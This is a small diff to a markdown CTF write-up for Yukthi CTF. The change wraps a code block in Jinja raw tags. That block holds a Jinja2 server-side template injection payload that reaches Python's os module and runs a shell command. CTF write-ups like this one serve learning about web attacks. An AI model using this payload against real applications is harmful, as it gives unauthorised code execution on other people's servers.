@@ -277,8 +277,10 @@ And ssti payload also works in this param.
 
 We can use the following template to get direct code execution. [Refer here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) for more payload.
 
-```
+```python
+{% raw %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
+{% endraw %}
 ```
 
 ![alt text](/commons/posts/2024-03-22-yukthi-ctf-writeups/image-46.png)
